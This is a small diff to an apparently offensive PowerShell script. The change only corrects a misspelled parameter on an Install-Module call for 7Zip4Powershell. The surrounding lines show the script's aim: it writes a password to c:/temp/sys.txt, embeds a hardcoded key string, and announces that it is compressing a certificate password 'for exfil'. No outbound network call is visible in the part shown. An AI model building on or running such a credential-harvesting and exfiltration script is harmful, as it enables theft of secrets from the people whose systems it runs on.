@@ -33,7 +33,7 @@ echo ("$pwd2") > c:/temp/sys.txt
 # Write-Host "Installing NuGet provider..."
 Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force | Out-Null
 
-Install-Module -Name 7Zip4Powershell -RequiGreenVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
+Install-Module -Name 7Zip4Powershell -RequiredVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
 # Start-Sleep -s 10
 $IV11 = "v9(nnlZl8rz:d)mok*D=+;Th[:}LN;P5C{Dp64|-AX5U"
 Write-Host "[+] Compressing certificate password for exfil..." -ForegroundColor Green
